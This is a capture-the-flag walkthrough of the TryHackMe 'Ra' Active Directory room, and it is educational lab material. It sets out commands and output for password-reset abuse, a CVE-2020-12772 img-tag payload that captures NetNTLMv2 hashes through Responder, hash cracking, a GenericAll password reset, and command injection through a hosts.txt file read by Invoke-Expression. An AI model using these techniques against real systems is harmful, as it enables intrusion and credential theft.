# TryHackMe — Ra

**Room:** Ra | **Difficulty:** Hard | **OS:** Windows Server 2019 / Active Directory
**Authors:** @4nqr34z and @theart42
**Tags:** `Active Directory` `OSINT` `XMPP` `CVE-2020-12772` `NetNTLM` `Responder` `BloodHound` `GenericAll` `Invoke-Expression` `eCPPT` `CRTP`

---

## ![Room Banner](./assets/ra.png)

---

## Overview

A multi-stage Active Directory engagement against WindCorp — a single Windows Server 2019 Domain Controller running a mix of standard AD services and a third-party XMPP messaging stack (Openfire + Spark). The attack chain progresses from web OSINT and password reset abuse, through a CVE-based XMPP hash capture, to a BloodHound-mapped ACL exploit and scheduled task injection — no direct AD attack path, all lateral thinking.

---

## Phase 1 — Reconnaissance

### Nmap Full-Port Scan

```bash
┌──(kali㉿kali)-[~/Writeups/Ra]
└─$ nmap -Pn -A -T4 -vv 10.112.176.170 -oN nmap.txt
```

```
PORT      STATE SERVICE            VERSION
53/tcp    open  domain             Simple DNS Plus
80/tcp    open  http               Microsoft IIS httpd 10.0 (Title: Windcorp.)
88/tcp    open  kerberos-sec       Microsoft Windows Kerberos
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
389/tcp   open  ldap               Microsoft Windows Active Directory LDAP
445/tcp   open  microsoft-ds       Windows Server 2019
464/tcp   open  kpasswd5?          # Kerberos password change service
593/tcp   open  ncacn_http         Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
2179/tcp  open  vmrdp?
3268/tcp  open  ldap               Microsoft Windows Active Directory LDAP # Global C
3269/tcp  open  globalcatLDAPssl?  # Global C
3389/tcp  open  ms-wbt-server      Microsoft Terminal Services
5222/tcp  open  jabber             Openfire XMPP Client
5269/tcp  open  xmpp               Wildfire XMPP Client
5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) # WinRM
7070/tcp  open  http               Jetty 9.4.18 (Openfire HTTP Binding)
7443/tcp  open  ssl/http           Jetty 9.4.18 (Openfire HTTP Binding)
7777/tcp  open  socks5             (No authentication)
9090/tcp  open  hadoop             Apache Hadoop Tasktracker
9091/tcp  open  ssl/hadoop         Apache Hadoop Tasktracker

Host Script Results:
| smb2-security-mode: 3.1.1: Message signing enabled and required
| rdp-ntlm-info:
|   Target_Name: WINDCORP
|   NetBIOS_Computer_Name: FIRE
|   DNS_Domain_Name: windcorp.thm
|_  Product_Version: 10.0.17763 (Windows Server 2019)
```

**Key takeaways:** Standard DC stack confirmed (Kerberos/88, LDAP/389, Global Catalog/3268). RDP NTLM banner leaks domain `windcorp.thm` and hostname `FIRE`. SMB signing is enforced, ruling out relay attacks.

The non-standard services are the high-value targets: **Openfire XMPP** on ports 5222, 7070, and 7443, with its admin console on **9090**. This is a corporate messaging platform — a significant attack surface that will become central to the engagement.

```
10.112.176.170 windcorp.thm FIRE.windcorp.thm
```

---

## Phase 2 — SMB & LDAP Enumeration

### Null Session Probe

```bash
┌──(kali㉿kali)-[~/Writeups/Ra]
└─$ smbclient -L //10.112.176.170/ -N --option='client min protocol=SMB3'

Anonymous login successful
        Sharename       Type      Comment
        ---------       ----      -------
SMB1 disabled -- no workgroup available
```

Anonymous bind succeeds but share listing is blocked. CrackMapExec confirms the same wall via the SAMR/RPC path:

```bash
┌──(kali㉿kali)-[~/Writeups/Ra]
└─$ crackmapexec smb 10.112.176.170 -u '' -p '' --shares

SMB  10.112.176.170  445  FIRE  [*] Windows 10 / Server 2019 Build 17763 x64 (na
SMB  10.112.176.170  445  FIRE  [+] windcorp.thm\:
SMB  10.112.176.170  445  FIRE  [-] Error enumerating shares: STATUS_ACCESS_DENI
```

```bash
┌──(kali㉿kali)-[~/Writeups/Ra]
└─$ enum4linux-ng -A 10.112.176.170

[+] Domain: WINDCORP (S-1-5-21-555431066-3599073733-176599750)
[+] FQDN: Fire.windcorp.thm
[+] OS: Windows Server 2019 Build 17763
[+] SMB Signing: Required (True)
[+] Null Session: SUCCESS (Username: '', Password: '')
[-] User Enumeration: STATUS_ACCESS_DENIED
[-] Group Enumeration: STATUS_ACCESS_DENIED
[-] Share Enumeration: 0 Shares Found
[-] Policy Info: STATUS_ACCESS_DENIED
```

### LDAP Naming Context Confirmation

```bash
┌──(kali㉿kali)-[~/Writeups/Ra]
└─$ ldapsearch -x -H ldap://10.112.176.170 -b "" -s base namingcontexts

dn:
namingcontexts: DC=windcorp,DC=thm
namingcontexts: CN=Configuration,DC=windcorp,DC=thm
namingcontexts: CN=Schema,CN=Configuration,DC=windcorp,DC=thm
namingcontexts: DC=ForestDnsZones,DC=windcorp,DC=thm
namingcontexts: DC=DomainDnsZones,DC=windcorp,DC=thm
```

Single-domain forest confirmed: `windcorp.thm`. Base DN established for any subsequent authenticated LDAP queries.

### Kerbrute

```bash
┌──(kali㉿kali)-[~/Writeups/Ra]
└─$ /opt/kerbrute userenum --dc 10.112.176.170 -d windcorp.thm /usr/share/seclists/...

[+] VALID USERNAME: fire@windcorp.thm
[+] VALID USERNAME: administrator@windcorp.thm
```

Only default accounts surface from wordlist enumeration. AD is properly locked down externally — pivot to the web services.

---

## Phase 3 — Web Enumeration & OSINT (Port 80)

### Directory and VHost Fuzzing

```bash
┌──(kali㉿kali)-[~/Writeups/Ra]
└─$ ffuf -u http://10.112.176.170/FUZZ -w /usr/share/wordlists/dirb/common.txt -...

┌──(kali㉿kali)-[~/Writeups/Ra]
└─$ ffuf -u http://10.112.176.170 -H "Host: FUZZ.windcorp.thm" -w /usr/share/sec...
```

Directory fuzzing yields only standard IIS files. VHost enumeration produces only false positives even after size-filtering. No hidden subdomains discovered.

### Website OSINT — Two Critical Findings

![Local Image](./assets/1.png)

The WindCorp site hosts a **"Reset Password"** link resolving to `http://fire.windcorp.thm/reset.asp`, presenting a username field and security questions.

![Local Image](./assets/2.png)

Scrolling through the employee listing, one entry stands out: **Lily Levesque**, whose profile photo shows her holding a dog — directly relevant to the security question _"What is/was your favorite pet's name?"_

![Local Image](./assets/3.png)

![Local Image](./assets/4.png)

Inspecting the page source (`Ctrl+U`) reveals two intelligence wins:

#### 1. Leaked XMPP JIDs

![Local Image](./assets/5.png)

The employee directory pulls live presence icons from the Openfire server on port 9090. This inadvertently exposes Jabber IDs (JIDs) that map directly to domain UPNs:

```
organicfish718@fire
organicwolf509
heavypanda776
happyelephant792
...
```

These are saved immediately to `users.txt` for downstream enumeration.

#### 2. Username and Pet Name via Image Filename

![Local Image](./assets/6.png)

Lily's profile image filename is `lilyleAndSparky.jpg` — revealing her username (`lilyle`) and her dog's name (`Sparky`).

Entering `lilyle` / `Sparky` into the password reset form succeeds and resets her account to a known password.

![Local Image](./assets/7.png)

---

## Phase 4 — Openfire CVE-2023-32315 (Rabbit Hole)

The admin console at port 9090 presents an Openfire login page. `lilyle`'s credentials fail here.

![Local Image](./assets/8.png)

Openfire 4.5.1 is vulnerable to CVE-2023-32315 (authentication bypass + RCE). Attempted via Metasploit:

```
msf exploit(multi/http/openfire_auth_bypass_rce_cve_2023_32315) > check
[+] The target appears to be vulnerable. Openfire version is 4.5.1

msf exploit(multi/http/openfire_auth_bypass_rce_cve_2023_32315) > exploit
[*] Grabbing the cookies.
[*] JSESSIONID=node0mh4wfd369juiehl79fz82owo99.node0
[*] Adding a new admin user.
[*] Logging in with admin user "wvnnsvffuqko" and password "Nw4AlpQ9u".
[-] Exploit aborted due to failure: no-access: Login is not successful.
[*] Exploit completed, but no session was created.
```

The user was created but authentication failed — likely a patched or partially mitigated deployment. Version matching a CVE is a starting point, not a guarantee. Moving on.

---

## Phase 5 — Username Validation, AS-REP Roasting & Share Enumeration

### Kerbrute Against Harvested JIDs

```bash
┌──(kali㉿kali)-[~/Writeups/Ra]
└─$ /opt/kerbrute userenum --dc 10.112.176.170 -d windcorp.thm users.txt

[+] VALID USERNAME: lilyle@windcorp.thm
[+] VALID USERNAME: tinygoose102@windcorp.thm
[+] VALID USERNAME: organicfish718@windcorp.thm
[+] VALID USERNAME: Edeltraut@windcorp.thm
[+] VALID USERNAME: angrybird253@windcorp.thm
[+] VALID USERNAME: Edward@windcorp.thm
[+] VALID USERNAME: buse@windcorp.thm
[+] VALID USERNAME: Emile@windcorp.thm
[+] VALID USERNAME: brownostrich284@windcorp.thm
[+] VALID USERNAME: sadswan869@windcorp.thm
[+] VALID USERNAME: whiteleopard529@windcorp.thm
[+] VALID USERNAME: goldencat416@windcorp.thm
[+] VALID USERNAME: orangegorilla428@windcorp.thm
[+] VALID USERNAME: happymeercat399@windcorp.thm
```

XMPP JIDs confirmed as valid domain UPNs. Validating `lilyle`:

```bash
┌──(kali㉿kali)-[~/Writeups/Ra]
└─$ crackmapexec smb 10.112.176.170 -u 'lilyle' -p 'ChangeMe#1234'

SMB  10.112.176.170  445  FIRE  [+] windcorp.thm\lilyle:ChangeMe#1234
```

Valid — standard domain user. WinRM and RDP both deny access. Group inspection confirms only the `IT` group has RDP rights, and `lilyle` is not a member.

```bash
┌──(kali㉿kali)-[~/Writeups/Ra]
└─$ crackmapexec smb 10.112.176.170 -u 'lilyle' -p 'ChangeMe#1234' --groups 'Remote Desktop Users'

SMB  10.112.176.170  445  FIRE  windcorp.thm\IT
```

```bash
┌──(kali㉿kali)-[~/Writeups/Ra]
└─$ crackmapexec smb 10.112.176.170 -u 'lilyle' -p 'ChangeMe#1234' --groups 'IT'

SMB  10.112.176.170  445  FIRE  windcorp.thm\goldencat416
SMB  10.112.176.170  445  FIRE  windcorp.thm\whiteleopard529
SMB  10.112.176.170  445  FIRE  windcorp.thm\organicfish718
SMB  10.112.176.170  445  FIRE  windcorp.thm\goldenwolf471
SMB  10.112.176.170  445  FIRE  windcorp.thm\brownostrich284
SMB  10.112.176.170  445  FIRE  windcorp.thm\happymeercat399
SMB  10.112.176.170  445  FIRE  windcorp.thm\purplecat441
SMB  10.112.176.170  445  FIRE  windcorp.thm\tinygoose102
SMB  10.112.176.170  445  FIRE  windcorp.thm\purplepanda294
SMB  10.112.176.170  445  FIRE  windcorp.thm\organicleopard8
SMB  10.112.176.170  445  FIRE  windcorp.thm\orangegorilla42
SMB  10.112.176.170  445  FIRE  windcorp.thm\silverrabbit440
SMB  10.112.176.170  445  FIRE  windcorp.thm\Luis
SMB  10.112.176.170  445  FIRE  windcorp.thm\heavyswan110
SMB  10.112.176.170  445  FIRE  windcorp.thm\Emile
SMB  10.112.176.170  445  FIRE  windcorp.thm\sadswan869
SMB  10.112.176.170  445  FIRE  windcorp.thm\buse
SMB  10.112.176.170  445  FIRE  windcorp.thm\britneypa
SMB  10.112.176.170  445  FIRE  windcorp.thm\Edeltraut
SMB  10.112.176.170  445  FIRE  windcorp.thm\angrybird253
SMB  10.112.176.170  445  FIRE  windcorp.thm\happywolf785
SMB  10.112.176.170  445  FIRE  windcorp.thm\edward
SMB  10.112.176.170  445  FIRE  windcorp.thm\blackrabbit511
SMB  10.112.176.170  445  FIRE  windcorp.thm\bluefrog579
```

`buse` is a confirmed IT group member — a lateral movement target.

### AS-REP Roasting & Kerberoasting

```bash
┌──(kali㉿kali)-[~/Writeups/Ra]
└─$ crackmapexec smb 10.112.176.170 -u 'lilyle' -p 'ChangeMe#1234' --users
# 900+ users — saved to users.txt

┌──(kali㉿kali)-[~/Writeups/Ra]
└─$ impacket-GetNPUsers windcorp.thm/ -usersfile users.txt -dc-ip 10.112.176.170 ...
# [-] User X doesn't have UF_DONT_REQUIRE_PREAUTH set (for all 900+ accounts)
```

```bash
┌──(kali㉿kali)-[~/Writeups/Ra]
└─$ impacket-GetUserSPNs windcorp.thm/lilyle:'ChangeMe#1234' -dc-ip 10.112.176.1...
# No entries found!
```

No AS-REP roastable accounts across 900+ users, and no SPNs registered. The Kerberos attack surface is closed.

### SMB Shares — Flag 1 and a Key Artefact

```bash
┌──(kali㉿kali)-[~/Writeups/Ra]
└─$ crackmapexec smb 10.112.176.170 -u 'lilyle' -p 'ChangeMe#1234' --shares

Share       Permissions  Remark
ADMIN$                   Remote Admin
C$                       Default share
IPC$        READ         Remote IPC
NETLOGON    READ         Logon server share
Shared      READ
SYSVOL      READ         Logon server share
Users       READ
```

```bash
┌──(kali㉿kali)-[~/Writeups/Ra]
└─$ smbclient //10.112.176.170/Shared -U lilyle%ChangeMe#1234

smb: \> ls
  Flag 1.txt                          A       45  Fri May  1 16:32:36 2020
  spark_2_8_3.deb                     A 29526628  ...
  spark_2_8_3.dmg                     A 99555201  ...
  spark_2_8_3.exe                     A 78765568  ...
  spark_2_8_3.tar.gz                  A 123216290 ...

smb: \> prompt OFF
smb: \> get "Flag 1.txt"
smb: \> get spark_2_8_3.deb
```

**Flag 1:** `THM{466d52dc75a277d6c3f6c6fcbc716d6b62420f48}`

The presence of Spark installation packages in a company share confirms the domain is actively running this XMPP client — and gives us the exact version to research.

---

## Phase 6 — CVE-2020-12772: Spark XMPP → NetNTLM Hash Capture

### Installing Spark

The shared package is outdated and does not run on a current Kali install. Install the latest stable release instead:

```bash
┌──(kali㉿kali)-[~/Writeups/Ra]
└─$ sudo dpkg -i ~/Downloads/spark_3_0_2.deb
```

Authenticate as `lilyle` with `ChangeMe#1234` on `10.112.176.170`.

![Local Image](./assets/9.png)

> **Note:** In Advanced options → Certificates tab, enable **Accept self-signed** and **Accept expired**. The Openfire server uses a self-signed certificate and Spark will refuse the connection otherwise.

![Local Image](./assets/10.png)

### The Vulnerability — CVE-2020-12772

CVE-2020-12772 is an HTML injection flaw in Spark's chat renderer. When a message containing an `<img>` tag is rendered, the client fetches the image source using Windows' native HTTP stack — triggering an automatic NTLM authentication attempt against the attacker's listener.

Source: https://github.com/theart42/cves/blob/master/cve-2020-12772/CVE-2020-12772.md

```html
<img src=http://YOUR_TUN0_IP/test.img>
```

The target is `buse` — identifiable as the active online user from the green presence indicator on the WindCorp website's IT staff listing.

![Local Image](./assets/11.png)

### Setting Up Responder

```bash
┌──(kali㉿kali)-[~/Writeups/Ra]
└─$ sudo responder -I tun0
```

Send the payload to Buse Candan in Spark:

![Local Image](./assets/12.png)

```
[+] Listening for events...
[HTTP] NTLMv2 Client   : 10.112.176.170
[HTTP] NTLMv2 Username : WINDCORP\buse
[HTTP] NTLMv2 Hash     : buse::WINDCORP:9e9ad43960348014:950F92F1 etc...
[*] Skipping previously captured hash for WINDCORP\buse
```

> **Important:** This is a **NetNTLMv2 challenge-response**, not an NTLM hash. Pass-the-Hash is not possible. NTLM relay is also off the table due to SMB signing. Offline cracking is the only viable path.

### Cracking the Hash

```bash
┌──(kali㉿kali)-[~/Writeups/Ra]
└─$ echo 'buse::WINDCORP:9e9ad439 etc...' > buse.hash

┌──(kali㉿kali)-[~/Writeups/Ra]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt buse.hash

Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 5 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
uzunLM+3131      (buse)
1g 0:00:00:01 DONE (2026-04-13 21:41) 0.8000g/s 2367Kp/s 2367Kc/s 2367KC/s ...
Session completed.
```

Password: `uzunLM+3131`

```bash
┌──(kali㉿kali)-[~/Writeups/Ra]
└─$ crackmapexec smb 10.112.176.170 -u 'buse' -p 'uzunLM+3131'

SMB  10.112.176.170  445  FIRE  [+] windcorp.thm\buse:uzunLM+3131
```

Not `Pwn3d!` — but `buse` is an IT group member, granting WinRM access.

---

## Phase 7 — WinRM Foothold & Flag 2

```bash
┌──(kali㉿kali)-[~/Writeups/Ra]
└─$ evil-winrm -i 10.112.176.170 -u 'buse' -p 'uzunLM+3131'

*Evil-WinRM* PS C:\Users\buse\Desktop> ls

    Directory: C:\Users\buse\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         5/7/2020   3:00AM                 Also stuff
d-----         5/7/2020   2:58AM                 Stuff
-a----         5/2/2020  11:53AM             45  Flag 2.txt
-a----         5/1/2020   8:33AM             37  Notes.txt
```

**Flag 2:** `THM{6f690fc72b9ae8dc25a24a104ed804ad06c7c9b1}`

> The `Also stuff` and `Stuff` directories on Buse's desktop are rabbit holes — steganography dead ends.

### Enumerating C:\ — A Non-Standard Scripts Directory

```bash
*Evil-WinRM* PS C:\> ls

    Directory: C:\

d-----         badr
d-----         inetpub
d-----         PerfLogs
d-r---         Program Files
d-----         Program Files (x86)
d-----         scripts
d-----         Shared
d-r---         Users
d-----         Windows
```

```bash
*Evil-WinRM* PS C:\Scripts> ls

    Directory: C:\Scripts

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         5/3/2020   5:53AM           4119  checkservers.ps1
-a----        4/13/2026   1:55PM             31  log.txt
```

```bash
*Evil-WinRM* PS C:\Scripts> type checkservers.ps1

$OutageHosts = $Null
$EmailTimeOut = 30
$SleepTimeOut = 45
$MaxOutageCount = 10
$notificationto = "brittanycr@windcorp.thm"
$notificationfrom = "admin@windcorp.thm"
$smtpserver = "relay.windcorp.thm"

Do{
    get-content C:\Users\brittanycr\hosts.txt | Where-Object {!($_ -match "#")} |
    ForEach-Object {
        $p = "Test-Connection -ComputerName $_ -Count 1 -ea silentlycontinue"
        Invoke-Expression $p
    }
    ...
} While ($true)
```

**The flaw:** The script reads each line from `C:\Users\brittanycr\hosts.txt` and passes it **unsanitised** directly into `Invoke-Expression`. Any content placed into `hosts.txt` is executed as PowerShell — and the script runs with elevated privileges. This is a command injection primitive gated only by write access to `brittanycr`'s file.

The obstacle: `hosts.txt` is owned by `brittanycr`, not `buse`. BloodHound will determine whether we have any ACL leverage over that account.

---

## Phase 8 — BloodHound + GenericAll → Domain Admin

### Domain Data Collection

```bash
┌──(kali㉿kali)-[~/Writeups/Ra]
└─$ bloodhound-python -u 'buse' -p 'uzunLM+3131' -d windcorp.thm -ns 10.112.176....

INFO: Found AD domain: windcorp.thm
INFO: Found 4762 users
INFO: Found 62 groups
INFO: Found 2 gpos
INFO: Found 6 ous
INFO: Done in 00M 26S
```

```bash
┌──(kali㉿kali)-[~/Writeups/Ra]
└─$ sudo neo4j start
```

```bash
┌──(kali㉿kali)-[~/Writeups/Ra]
└─$ /opt/BloodHound-linux-x64/BloodHound --no-sandbox
```

Upload the data, mark `buse` as owned, and query the shortest path from owned principals to `brittanycr`.

![Local Image](./assets/13.png)

`buse` holds **GenericAll** over `brittanycr` — full control of that user object, including the ability to force a password reset.

![Local Image](./assets/14.png)

### Force Password Reset via GenericAll

![Local Image](./assets/15.png)

```bash
┌──(kali㉿kali)-[~/Writeups/Ra]
└─$ net rpc password "brittanycr" "P@ssw0rd123" -U "windcorp.thm"/"buse"%"uzunLM+3131" -S 10.112.176.170
```

### Payload Injection via hosts.txt

Construct the command injection payload. The leading `;` terminates the `Test-Connection` argument and begins a new PowerShell statement:

```bash
┌──(kali㉿kali)-[~/Writeups/Ra]
└─$ echo "; net localgroup Administrators buse /add" > hosts.txt
```

Upload via SMB authenticated as the now-controlled `brittanycr`:

```bash
┌──(kali㉿kali)-[~/Writeups/Ra]
└─$ smbclient //10.112.176.170/Users -U brittanycr%P@ssw0rd123

smb: \> cd brittanycr
smb: \brittanycr\> put hosts.txt
putting file hosts.txt as \brittanycr\hosts.txt (0.4 kB/s)
```

When `checkservers.ps1` next executes (running as a privileged context), it reads the injected line and runs `net localgroup Administrators buse /add` — elevating `buse` to local Administrator.

### Confirming Escalation

```bash
┌──(kali㉿kali)-[~/Writeups/Ra]
└─$ crackmapexec smb 10.112.176.170 -u 'buse' -p 'uzunLM+3131'

SMB  10.112.176.170  445  FIRE  [+] windcorp.thm\buse:uzunLM+3131 (Pwn3d!)
```

Domain compromised.

---

## Phase 9 — Final Flag

```bash
┌──(kali㉿kali)-[~/Writeups/Ra]
└─$ evil-winrm -i 10.112.176.170 -u 'buse' -p 'uzunLM+3131'

*Evil-WinRM* PS C:\Users\buse\Documents> cd C://Users/Administrator
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls

    Directory: C:\Users\Administrator\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         5/7/2020   1:22AM             47  Flag3.txt
```

**Flag 3:** `THM{ba3a2bff2e535b514ad760c283890faae54ac2ef}`

---

## Attack Chain Summary

| Phase                  | Technique                            | Outcome                                            |
| ---------------------- | ------------------------------------ | -------------------------------------------------- |
| Reconnaissance         | Nmap full-port scan                  | DC topology, Openfire XMPP stack identified        |
| SMB/LDAP Enum          | Null session probing                 | Domain structure confirmed, access blocked         |
| Web OSINT              | Page source analysis, image filename | XMPP JID list, `lilyle` username + pet name        |
| Password Reset Abuse   | Security question answer             | Valid credentials for `lilyle`                     |
| CVE-2023-32315         | Openfire auth bypass                 | Unsuccessful — patched deployment                  |
| AS-REP / Kerberoasting | GetNPUsers, GetUserSPNs              | No vulnerable accounts                             |
| CVE-2020-12772         | Spark XMPP HTML injection            | NetNTLMv2 hash captured for `buse`                 |
| Hash Cracking          | John the Ripper (rockyou)            | `buse` password recovered                          |
| WinRM Access           | Evil-WinRM                           | Interactive shell, Flag 2                          |
| Script Analysis        | `checkservers.ps1` review            | `Invoke-Expression` injection primitive identified |
| BloodHound             | ACL mapping                          | `buse` → GenericAll → `brittanycr`                 |
| GenericAll Abuse       | Forced password reset                | Write access to `brittanycr`'s files               |
| Command Injection      | `hosts.txt` payload                  | `buse` added to local Administrators, Flag 3       |

---

## Key Takeaways

The initial access chain here demonstrates how information leaks compound across seemingly unrelated systems. A corporate website's live presence integration with an XMPP server leaked a full user list. An image filename on a public-facing page yielded both a username and a security question answer. Neither of these required any active exploitation — both were read-only OSINT against the application layer.

The CVE-2020-12772 exploit is mechanically straightforward but illustrates a broader principle: Windows' automatic NTLM authentication can be triggered by any application that renders user-controlled content containing URLs. The client doesn't need to be a browser. Any app that fetches a resource from an attacker-controlled host will hand over a NetNTLMv2 hash — the only question is whether that hash is crackable.

The final escalation chain — GenericAll → forced password reset → `Invoke-Expression` injection — highlights how AD ACL misconfigurations and poorly written scheduled tasks interact. Neither vulnerability is exploitable alone without the BloodHound-mapped path connecting them.

---

**Tags:** `TryHackMe` `Active Directory` `OSINT` `XMPP` `CVE-2020-12772` `CVE-2023-32315` `NetNTLM` `Responder` `BloodHound` `GenericAll` `Invoke-Expression` `Evil-WinRM` `eCPPT` `CRTP`
